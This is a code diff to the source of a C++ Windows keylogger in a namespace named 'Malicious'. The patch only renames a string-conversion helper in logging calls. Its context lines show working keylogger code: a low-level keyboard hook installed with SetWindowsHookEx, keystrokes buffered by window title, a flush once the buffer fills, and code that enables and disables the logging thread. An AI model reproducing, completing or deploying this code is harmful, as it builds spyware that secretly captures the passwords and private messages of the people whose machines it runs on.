@@ -166,7 +166,7 @@ namespace Malicious
             hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
 		    if(hThread == NULL)
 		    {
-			    LOG << "CreateThreadfailed : " + to_string(GetLastError());
+			    LOG << "CreateThreadfailed : " + toString(GetLastError());
 		    }
             LOG << "Keylogging enabled";
             isActivated = true;
@@ -180,12 +180,12 @@ namespace Malicious
         {
             if(!TerminateThread(hThread, 0))
 		    {
-			    LOG << "TerminateThread failed : " + to_string(GetLastError());
+			    LOG << "TerminateThread failed : " + toString(GetLastError());
 		    }
 
             if(!UnhookWindowsHookEx(hook))
 		    {
-			    LOG << "UnhookWindowsHookEx failed : " + to_string(GetLastError());
+			    LOG << "UnhookWindowsHookEx failed : " + toString(GetLastError());
 		    }
             LOG << "Keylogging disabled";
             isActivated = false;
@@ -233,7 +233,7 @@ namespace Malicious
         updateWindowTitle();
         log_buffer[window] += key;
 		buffered_char++;
-		LOG << "Key : " + to_string(key) + " <=> " + window + ", buffer = " + to_string(buffered_char);
+		LOG << "Key : " + toString(key) + " <=> " + window + ", buffer = " + toString(buffered_char);
 		if(buffered_char >= MAX_BUFFERED)
 		{
 			flush();
@@ -247,7 +247,7 @@ namespace Malicious
         Keylogger::instance().hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyloggingProc, GetModuleHandle(0), 0);
 		if(Keylogger::instance().hook == NULL)
 		{
-			LOG << "SetWindowsHookEx failed : " + to_string(GetLastError());
+			LOG << "SetWindowsHookEx failed : " + toString(GetLastError());
         }
 
         MSG message;
